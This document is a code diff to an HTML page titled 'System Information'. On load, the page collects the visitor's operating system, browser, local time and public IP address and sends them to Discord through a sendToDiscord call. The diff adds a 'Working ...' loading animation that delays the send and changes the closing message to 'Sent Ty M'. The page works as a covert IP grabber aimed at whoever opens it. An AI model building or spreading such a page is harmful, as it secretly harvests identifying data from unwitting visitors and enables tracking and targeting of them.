@@ -8,10 +8,28 @@
 <body>
     <h1>System Information</h1>
     <div id="output">
-        <p>Sent ty bbg</p>
+        <p id="loading">Loading...</p>
     </div>
 
     <script>
+        function displayLoadingMessage() {
+            const loadingElement = document.getElementById('loading');
+            let counter = 0;
+            loadingElement.textContent = 'Working .';
+            const intervalId = setInterval(() => {
+                counter++;
+                if (counter === 1) {
+                    loadingElement.textContent = 'Working ..';
+                } else if (counter === 2) {
+                    loadingElement.textContent = 'Working ...';
+                } else {
+                    clearInterval(intervalId);
+                    loadingElement.textContent = 'Sent Ty M';
+                    main();
+                }
+            }, 1000);
+        }
+
         async function getOsInfo() {
             return navigator.platform;
         }
@@ -55,14 +73,14 @@
                 const message = `**OS:** ${osInfo}\n**Browser:** ${browserInfo}\n**Current Time (EST):** ${timeInfo}\n**Public IP:** ${publicIp}`;
                 await sendToDiscord(message);
 
-                outputDiv.innerHTML = "Sent ty bbg";
+                outputDiv.innerHTML = "Sent Ty M";
             } catch (error) {
                 console.error('Error:', error);
                 outputDiv.textContent = 'Error: ' + error;
             }
         }
 
-        main();
+        displayLoadingMessage();
     </script>
 </body>
 </html>
